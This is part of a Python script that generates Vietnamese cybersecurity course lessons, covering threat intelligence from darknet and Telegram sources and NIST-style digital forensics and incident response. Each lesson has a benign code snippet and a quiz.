            ["Tuyệt đối không tham gia hoặc sử dụng các dịch vụ trộn tiền bất hợp pháp vì vi phạm nghiêm trọng luật phòng chống rửa tiền quốc tế.", "Hiểu rõ rằng hầu hết các địa chỉ ví từng qua máy trộn tiền đều bị đưa vào danh sách đen của các sàn giao dịch."],
            ["Bitcoin không thể rửa dễ dàng do tính minh bạch tuyệt đối của sổ cái Blockchain.", "CoinJoin là giao thức trộn tiền phân tán kết hợp nhiều đầu vào và đầu ra có cùng giá trị.", "Cơ quan hành pháp toàn cầu đang áp dụng chế tài hình sự đối với các dịch vụ trộn tiền mã hóa."],
            [
                {"question": "Giao thức nào cho phép nhiều người dùng kết hợp tạo ra một giao dịch Bitcoin chung với các đầu ra bằng nhau để xóa dấu vết?", "type": "MULTIPLE_CHOICE", "options": ["CoinJoin", "Lightning Network", "Proof-of-Stake", "Smart Contract"], "correct_index": 0, "explanation": "Giao thức CoinJoin."},
                {"question": "Các địa chỉ ví tiền mã hóa từng tương tác với dịch vụ trộn tiền thường bị gắn cờ gì trên các sàn giao dịch?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["Tainted", "tainted", "Dính chàm", "Blacklist"]}], "explanation": "Tainted (dính chàm) hoặc Blacklist."},
                {"question": "Mọi giao dịch Bitcoin trên Blockchain đều có thể được theo dõi công khai bởi bất kỳ ai?", "type": "TRUE_FALSE", "correct_value": True, "explanation": "Đúng. Sổ cái Bitcoin hoàn toàn mở và minh bạch."}
            ]
        ),
        (
            12,
            "Bài 3.12: Tình Báo Mối Đe Dọa (Threat Intelligence): Giám Sát Diễn Đàn Ngầm & Rò Rỉ Dữ Liệu",
            "Xây dựng hệ thống Threat Intelligence: Thu thập dữ liệu từ các diễn đàn Darknet, giám sát kênh Telegram ngầm và phân tích dấu hiệu cảnh báo sớm.",
            "https://www.youtube.com/watch?v=tu-CbGRuS-E",
            [
                "Nắm vững các cấp độ tình báo mối đe dọa: Strategic, Tactical, Operational và Technical Threat Intelligence.",
                "Thực hành xây dựng các công cụ thu thập tự động (Scrapers/Crawlers) trên mạng Tor và Telegram.",
                "Phân tích và cảnh báo sớm các nguy cơ rò rỉ dữ liệu doanh nghiệp và mã độc tấn công."
            ],
            [
                (
                    "Khái Niệm & Vai Trò Của Threat Intelligence (CTI)",
                    "Tình báo mối đe dọa không gian mạng (Cyber Threat Intelligence - CTI) là thông tin dựa trên bằng chứng về các mối đe dọa, bao gồm bối cảnh, cơ chế, các chỉ số, động cơ và kế hoạch hành động của đối thủ. Thay vì ngồi đợi tin tặc tấn công vào tường lửa để phản ứng (Reactive Defense), CTI giúp doanh nghiệp chủ động giám sát các hoạt động chuẩn bị tấn công của tin tặc ngay từ khi chúng còn đang bàn luận trên các diễn đàn ngầm (Proactive Defense)."
                ),
                (
                    "Các Nguồn Thu Thập Tình Báo Darknet & Telegram",
                    "Hoạt động tình báo ngầm tập trung vào 3 nguồn tài nguyên chính: 1. Diễn Đàn Ngầm Chuyên Sâu (BreachForums, Exploit.in, XSS.is): Nơi các tin tặc đăng bài bán dữ liệu, trao đổi 0-day và tuyển mộ đồng phạm. 2. Các Kênh Telegram Tội Phạm: Telegram đã trở thành trung tâm giao dịch ngầm mới thay thế một phần Darknet nhờ tính tiện lợi và tốc độ cập nhật theo thời gian thực. 3. Trang Tống Tiền Của Các Nhóm Ransomware (Ransomware Data Leak Sites - DLS): Nơi các băng đảng như LockBit, ALPHV công bố tên tuổi của các công ty nạn nhân từ chối trả tiền chuộc."
                ),
                (
                    "Quy Trình Xử Lý & Chuyển Đổi Dữ Liệu Tình Báo",
                    "Dữ liệu thô thu thập từ Darknet phải đi qua Chu trình Tình báo (Intelligence Cycle): Thu thập (Collection) -> Xử lý (Processing) -> Phân tích (Analysis) -> Sản xuất báo cáo và Chỉ số nhận diện xâm phạm (IoCs / STIX / TAXII) -> Tích hợp vào hệ thống SIEM/SOAR của trung tâm SOC để tự động chặn các địa chỉ IP và tên miền nguy hiểm."
                )
            ],
            "Kịch bản cảnh báo sớm: Phát Hiện Rò Rỉ Thông Tin Đăng Nhập Trước Cuộc Tấn Công: Chuyên gia CTI phát hiện một bài đăng trên diễn đàn ngầm rao bán tệp log chứa 500 tài khoản email nội bộ của công ty. Đội ngũ an ninh lập tức kích hoạt quy trình thu hồi phiên đăng nhập, buộc toàn bộ nhân viên đổi mật khẩu và bật MFA, chặn đứng cuộc tấn công trước khi tin tặc kịp sử dụng quyền truy cập đó.",
            "Thực hành viết script Python thu thập thông tin tiêu đề từ một nguồn cấp dữ liệu tình báo an ninh:",
            ("python", """import urllib.request
import json

# Truy vấn dữ liệu mối đe dọa từ kho lưu trữ Abuse.ch URLhaus
url = "https://urlhaus-api.abuse.ch/v1/urls/recent/"
print("Đang kết nối tới máy chủ tình báo mối đe dọa Abuse.ch...")
req = urllib.request.Request(url, headers={'User-Agent': 'CTI-Collector/1.0'})
try:
    with urllib.request.urlopen(req, timeout=5) as res:
        data = json.loads(res.read().decode())
        print(f"[+] Lấy dữ liệu thành công! Trạng thái API: {data.get('query_status')}")
        print(f"[+] Số lượng URL độc hại vừa được cập nhật: {len(data.get('urls', []))}")
except Exception as e:
    print("[-] Không thể kết nối API hoặc mạng bị giới hạn:", e)"""),
            ["Luôn tuân thủ nguyên tắc an toàn tác chiến (OPSEC) nghiêm ngặt khi tạo tài khoản tàu ngầm nằm vùng trên các diễn đàn tội phạm.", "Không bao giờ tham gia kích động hoặc hướng dẫn các hành vi tấn công mạng trên diễn đàn."],
            ["Threat Intelligence giúp doanh nghiệp chuyển đổi từ thế bị động sang chủ động phòng thủ.", "Các diễn đàn Darknet, kênh Telegram ngầm và trang DLS là nguồn dữ liệu CTI vô giá.", "Chu trình tình báo chuyển đổi dữ liệu thô thành các chỉ số IoC tích hợp vào SIEM/SOC."],
            [
                {"question": "Mục tiêu chính của hoạt động Threat Intelligence (CTI) là gì?", "type": "MULTIPLE_CHOICE", "options": ["Tấn công phá hủy máy chủ của hacker", "Chủ động thu thập và phân tích thông tin về kẻ thù để phòng thủ sớm", "Tạo ra các loại virus mới", "Bán lại dữ liệu cho đối thủ"], "correct_index": 1, "explanation": "Chủ động phát hiện và ngăn chặn mối đe dọa từ sớm."},
                {"question": "Định dạng dữ liệu chuẩn quốc tế phổ biến để trao đổi thông tin tình báo mối đe dọa số là gì?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["STIX", "STIX/TAXII", "stix"]}], "explanation": "Structured Threat Information Expression (STIX)."},
                {"question": "Telegram hiện nay được nhiều nhóm tội phạm mạng sử dụng song song với Darknet để trao đổi dữ liệu?", "type": "TRUE_FALSE", "correct_value": True, "explanation": "Đúng. Telegram là kênh truyền thông ngầm cực kỳ phổ biến."}
            ]
        ),
        (
            13,
            "Bài 3.13: Điều Tra Pháp Y Số (Digital Forensics) & Phản Ứng Sự Cố Sau Tấn Công Dark Web",
            "Quy trình phản ứng sự cố an ninh mạng (Incident Response) theo chuẩn NIST/SANS: Thu thập chứng cứ pháp y, phân tích dòng thời gian (Timeline) và bảo toàn tính toàn vẹn Chain of Custody.",
            "https://www.youtube.com/watch?v=ddwhVIGjp4Q",
            [
                "Nắm vững 6 bước của quy trình ứng cứu sự cố an ninh mạng theo tiêu chuẩn quốc tế NIST SP 800-61.",
                "Hiểu rõ nguyên tắc bảo toàn chuỗi hành trình chứng cứ (Chain of Custody) trong điều tra số.",
                "Thực hành trích xuất chứng cứ bộ nhớ RAM và tạo dòng thời gian sự cố (Timeline Analysis)."
            ],
            [
                (
                    "Quy Trình Phản Ứng Sự Cố Chuẩn NIST SP 800-61",
                    "Khi một doanh nghiệp phát hiện dữ liệu của mình bị rao bán trên Darknet hoặc hệ thống bị mã hóa ransomware, một chiến dịch Ứng Cứu Sự Cố (Incident Response - IR) chuyên nghiệp bắt buộc phải tuân theo 6 giai đoạn chuẩn của Viện Tiêu chuẩn và Kỹ thuật Quốc gia Hoa Kỳ (NIST): 1. Preparation (Chuẩn bị): Đào tạo nhân sự, chuẩn bị công cụ và kế hoạch dự phòng. 2. Detection & Analysis (Phát hiện & Phân tích): Xác định phạm vi bị ảnh hưởng, nguồn gốc lây nhiễm và mức độ thiệt hại. 3. Containment (Cô lập): Ngăn chặn mã độc lây lan (cô lập máy trạm khỏi mạng, thu hồi tài khoản). 4. Eradication (Loại bỏ): Xóa sạch mã độc, backdoor và các cơ chế duy trì truy cập của tin tặc. 5. Recovery (Khôi phục): Khôi phục hệ thống từ các bản sao lưu sạch và giám sát chặt chẽ. 6. Post-Incident Activity (Hậu sự cố / Bài học kinh nghiệm): Lập báo cáo chi tiết và nâng cấp hệ thống phòng thủ."
                ),
                (
                    "Chuỗi Hành Trình Chứng Cứ (Chain of Custody) & Trật Tự Biến Mất",
                    "Trong điều tra pháp y số, một chứng cứ kỹ thuật số (tệp nhật ký, ảnh đĩa, tệp dump RAM) chỉ có giá trị pháp lý trước tòa án nếu nó tuân thủ nghiêm ngặt **Chuỗi hành trình chứng cứ (Chain of Custody)**: Ai đã thu thập chứng cứ? Vào thời gian nào? Bằng công cụ gì? Mã băm SHA-256 ban đầu là bao nhiêu? Hơn thế nữa, chuyên viên điều tra phải tuân thủ Trật Tự Biến Mất Của Dữ Liệu (Order of Volatility): Thu thập dữ liệu dễ bay màu trước (Bộ nhớ RAM, bảng định tuyến mạng, kết nối đang mở) trước khi tắt máy để thu thập dữ liệu trên ổ cứng (Data at Rest)."
                ),
                (
                    "Xây Dựng Dòng Thời Gian Sự Cố (Super Timeline Analysis)",
                    "Kỹ năng tối thượng của chuyên gia điều tra số là xâu chuỗi hàng triệu sự kiện rời rạc thành một dòng thời gian duy nhất (Timeline): Từ thời điểm người dùng nhấp vào email lừa đảo lúc 09:15, tiến trình lạ được tạo lúc 09:16, kết nối C2 thiết lập lúc 09:17, cho đến khi dữ liệu bị đẩy ra ngoài lúc 23:45. Công cụ như `log2timeline` (Plaso) giúp tự động hóa quá trình dựng lại toàn bộ kịch bản vụ án."
                )
            ],
            "Sai lầm tai hại khi xử lý sự cố: Ngắt Nguồn Máy Tính Đột Ngột: Khi phát hiện máy tính bị tấn công, phản xạ đầu tiên của quản trị viên thiếu kinh nghiệm là rút phích cắm điện. Hành động này xóa sạch 100% dữ liệu trong RAM - nơi chứa mã độc không tệp tin (Fileless Malware), khóa giải mã ransomware và các kết nối mạng C2 trực tiếp, khiến công tác điều tra đi vào ngõ cụt.",
            "Thực hành trích xuất thông tin kết nối và tiến trình để bảo tồn chứng cứ bộ nhớ bằng lệnh PowerShell:",
            ("powershell", """# Thu thập danh sách các kết nối mạng đang mở và tiến trình sở hữu kết nối đó
echo "=== THU THẬP CHỨNG CỨ MẠNG TRỰC TIẾP (LIVE FORENSICS) ==="
Get-NetTCPConnection | Where-Object { $_.State -eq "Established" } | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess

# Tính toán mã băm SHA-256 của tệp nhật ký hệ thống để niêm phong chứng cứ
Get-FileHash -Algorithm SHA256 "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx" """),
            ["Luôn chụp ảnh bộ nhớ RAM trước khi thực hiện bất kỳ hành động cô lập hay tắt nguồn thiết bị.", "Ghi nhật ký chi tiết từng thao tác điều tra để đảm bảo tính toàn vẹn của Chain of Custody."],
            ["Quy trình phản ứng sự cố chuẩn NIST gồm 6 giai đoạn chặt chẽ.", "Trật tự biến mất (Order of Volatility) yêu cầu thu thập dữ liệu trong RAM trước ổ đĩa.", "Bảo toàn mã băm SHA-256 là điều kiện tiên quyết để chứng cứ được chấp nhận trước tòa án."],
            [
                {"question": "Theo trật tự biến mất của dữ liệu (Order of Volatility), loại dữ liệu nào cần được ưu tiên thu thập đầu tiên khi xử lý sự cố?", "type": "MULTIPLE_CHOICE", "options": ["Dữ liệu trên ổ cứng thể rắn SSD", "Bộ nhớ RAM và kết nối mạng đang hoạt động", "Tệp sao lưu trên băng từ", "Nhật ký in ra giấy"], "correct_index": 1, "explanation": "Bộ nhớ RAM và kết nối mạng biến mất ngay khi tắt máy nên phải thu thập đầu tiên."},
                {"question": "Quy trình ghi nhận chi tiết ai thu thập chứng cứ, thời gian và mã băm để bảo đảm tính pháp lý trước tòa gọi là gì?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["Chain of Custody", "chain of custody", "Chuỗi hành trình chứng cứ"]}], "explanation": "Chain of Custody (Chuỗi hành trình chứng cứ)."},
                {"question": "Rút ngay phích cắm điện máy chủ khi phát hiện mã độc là hành động được khuyến nghị bởi các chuyên gia pháp y số?", "type": "TRUE_FALSE", "correct_value": False, "explanation": "Sai. Rút phích cắm sẽ làm mất toàn bộ dữ liệu điều tra quý giá trong bộ nhớ RAM."}
            ]
        )
    ]

    for (pos, title, summary, v_url, obj_pts, theory_secs, att_def, lab_inst, code_snip, pits, sums, q_json) in configs_part2:
        l = {
            "position": pos,
            "title": title,
            "summary": summary,
            "duration_minutes": 35,
            "video_url": v_url,
            "markdown_content": generate_lesson_markdown(
                lesson_num=f"3.{pos}",
                title=title,
                objective_points=obj_pts,
                theory_sections=theory_secs,
                attack_defense_section=att_def,
                lab_instructions=lab_inst,
                code_snippet=code_snip,
                pitfalls=pits,
                summary_points=sums,
                video_url=v_url,
                quiz_json=q_json,
            )
        }
        validate_lesson_data(l)
        lessons.append(l)

    return lessons


if __name__ == "__main__":
    ls = get_chapter_3_lessons()
    print(f"Generated {len(ls)} lessons for Chapter 3.")
    for l in ls:
        wc = count_vietnamese_words(l["markdown_content"])
        print(f"  - {l['title'][:40]}: {wc} words")
